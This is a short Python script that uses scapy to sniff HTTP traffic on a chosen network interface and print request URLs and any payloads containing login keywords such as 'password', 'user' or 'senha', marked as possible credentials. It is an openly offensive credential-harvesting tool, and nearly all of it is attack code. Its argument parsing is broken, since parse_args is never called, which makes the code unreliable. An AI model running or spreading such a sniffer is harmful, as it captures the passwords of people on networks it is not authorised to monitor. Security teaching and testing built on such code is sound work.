#!/usr/bin/python
#-*-coding:utf-8-*-

#####################################################
#                                                   #
#   UNICIV - Centro de Inovação VincIT              #
#   https://www.uniciv.com.br                       #
#                                                   #
#   Desenvolvedor: h1s0k4                           #
#   E-mail: willian_brito00@hotmail.com             #
#                                                   #
#   USAGE: python sniffer_password.py               #
#                                                   #
#####################################################

import scapy.all as scapy
from scapy_http import http
import argparse

#pip install scapy_http	

def get_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-i", "--interface", dest="interface", help="Interface Name")

	options = parser.parse_args
	return options

def sniff_packet(interface):
	scapy.sniff(iface=interface, store=False, prn=process_packets)

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_credentials(packet):
	if packet.haslayer(scapy.Raw):
		load = packet[scapy.Raw].load
		Keywords = ["login", "password", "user", "username", "pass", "usuario", "senha", "contrasena", "logon", "access"]

		for Keyword in Keywords:
			if Keyword in load:
				return load

def process_packets(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		print ("[+] Http Request >> "+ url)
		credentials = get_credentials(packet)

		if credentials:
			print("[+] Possible password/Username "+ credentials +"\n\n")

options = get_arguments()
sniff_packet(options.interface)